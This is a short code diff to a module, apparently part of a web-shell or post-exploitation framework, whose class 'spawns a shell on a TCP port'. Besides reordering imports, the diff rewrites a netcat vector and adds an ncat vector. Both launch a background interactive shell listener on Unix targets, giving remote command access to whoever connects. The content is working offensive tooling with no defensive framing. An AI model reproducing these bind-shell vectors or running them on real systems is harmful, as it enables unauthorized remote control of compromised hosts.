@@ -1,10 +1,12 @@
-from core.vectors import PythonCode, ShellCmd, Os
-from core.module import Module
-from core.loggers import log
-from core import messages
-import urllib.parse
 import telnetlib
 import time
+import urllib.parse
+
+from core import messages
+from core.loggers import log
+from core.module import Module
+from core.vectors import ShellCmd, PythonCode, Os
+
 
 class Tcp(Module):
     """Spawn a shell on a TCP port."""
@@ -23,8 +25,14 @@ class Tcp(Module):
         self.register_vectors(
             [
             ShellCmd(
-              "nc -l -p ${port} -e ${shell}",
+              "nc -nlp ${port} -c '${shell} -i 2>&1' ",
               name = 'netcat',
+              target = Os.NIX,
+              background = True
+              ),
+            ShellCmd(
+              "ncat -nlp ${port} -c '${shell} -i 2>&1' ",
+              name = 'nc.nmap',
               target = Os.NIX,
               background = True
               ),
